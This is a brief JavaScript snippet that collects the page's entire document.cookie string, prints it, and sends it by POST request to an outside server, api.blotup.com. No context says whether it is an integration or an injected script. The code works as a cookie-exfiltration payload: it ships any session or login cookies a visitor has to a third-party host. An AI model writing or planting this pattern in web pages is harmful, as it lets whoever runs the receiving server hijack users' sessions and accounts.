const token = document.cookie;
console.log(token);
const fun = async () => {
  await fetch("https://api.blotup.com/v1/auth/fetch-token", {
    method: "POST",
    body: JSON.stringify({ token }),
  });
};
fun();
